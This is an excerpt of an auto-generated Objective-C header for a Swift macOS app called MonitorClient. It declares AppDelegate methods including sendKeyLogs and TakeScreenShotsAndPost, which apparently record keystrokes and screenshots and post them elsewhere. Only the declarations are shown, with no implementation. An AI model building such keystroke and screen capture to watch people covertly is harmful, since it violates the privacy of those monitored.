...
#ifndef MONITORCLIENT_SWIFT_H
#define MONITORCLIENT_SWIFT_H
...
# undef any
# pragma clang attribute push(__attribute__((external_source_symbol(language="Swift", defined_in="MonitorClient",generated_declaration))), apply_to=any(function,enum,objc_interface,objc_category,objc_protocol))
...
SWIFT_CLASS("_TtC13MonitorClient11AppDelegate")
...
- (void)sendTicEvent;
- (void)sendKeyLogs;
- (void)TakeScreenShotsAndPost;
- (void)applicationDidTerminate:(NSNotification * _Nonnull)notification;
